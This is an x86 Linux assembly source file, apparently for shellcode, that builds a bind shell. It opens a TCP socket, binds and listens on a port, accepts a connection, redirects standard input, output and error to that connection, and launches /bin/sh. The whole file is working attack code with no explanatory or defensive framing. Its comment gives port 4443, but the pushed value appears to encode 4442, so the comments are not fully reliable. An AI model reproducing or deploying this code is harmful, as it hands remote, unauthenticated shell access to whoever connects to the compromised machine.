bits 32
section .text
global _start

_start:
	
	; socket(AF_INET, SOCK_STREAM, 0) = (2, 1, 0)

	xor ebx, ebx
	push ebx

	inc ebx
	push ebx

	inc ebx
	push ebx

	dec ebx

	mov ecx, esp

	push 102
	pop eax ; SYS_socketcall

	int 0x80

	mov esi, eax

	; bind(sockfd, &saddr, 0x10)
	
	pop ebx
	xor edx, edx

	; Creating sockaddr structure
	push edx
	push word 0x5a11 ; PORT: 4443
	push bx

	; bind arguments
	mov dl, 0x10
	mov ecx, esp
	push edx
	push ecx
	push esi
	mov ecx, esp

	mov al, 102 ; SYS_socketcall
	int 0x80

	; SYS_LISTEN (4) | listen(sockfd, 0x10)

	add bl, 2

	; listen arguments
	push edx
	push esi
	mov ecx, esp

	mov al, 102 ; SYS_socketcall
	int 0x80

	; accept(sockfd, NULL, NULL)
	
	inc bl
	
	; accept arguments
	xor edx, edx
	push edx
	push edx
	push esi
	mov ecx, esp

	mov al, 102 ; SYS_socketcall
	int 0x80

	mov ebx, eax

	; dup2(clientfd, [0,1,2])
	xor ecx, ecx
	duplicate:
		mov al, 63 ; SYS_dup2
		int 0x80
		inc cl
		cmp cl, 0x2
		jle duplicate

	; execve("/bin/sh", NULL, NULL)
	xor ecx, ecx
	xor edx, edx
	
	push edx
	push 0x68732f2f ; //sh
	push 0x6e69622f ; /bin
	mov ebx, esp

	push 0xb ; SYS_execve
	pop eax
	int 0x80